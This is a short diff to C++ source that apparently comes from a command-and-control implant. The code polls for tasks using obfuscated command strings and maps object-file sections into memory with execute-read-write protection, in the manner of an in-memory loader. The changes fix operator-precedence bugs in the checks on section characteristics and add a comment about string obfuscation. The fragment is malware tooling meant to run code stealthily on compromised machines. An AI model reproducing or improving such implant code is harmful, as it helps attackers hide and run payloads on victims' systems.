@@ -709,6 +709,7 @@ namespace Memory {
             const auto cmd_id   = Parser::UnpackString(&parser, nullptr);
 
             // todo : add hashes for commands instead of using OBF()
+            // maybe formatted strings can use obf
             if (cmd_id == OBF("NoJob")) {
                 goto defer;
             }
@@ -779,7 +780,7 @@ namespace Memory {
                     default: protection = PAGE_EXECUTE_READWRITE;
                     }
 
-                    if (object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED == IMAGE_SCN_MEM_NOT_CACHED) {
+                    if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                         protection |= PAGE_NOCACHE;
                     }
 
@@ -817,7 +818,7 @@ namespace Memory {
                 if (U_PTR(exec) >= U_PTR(object->sec_map[i].address) && U_PTR(exec) < U_PTR(object->sec_map[i].address) + object->sec_map[i].size) {
 
                     object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);
-                    if (object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE == IMAGE_SCN_MEM_EXECUTE) {
+                    if ((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {
                         success = true;
                     }
 
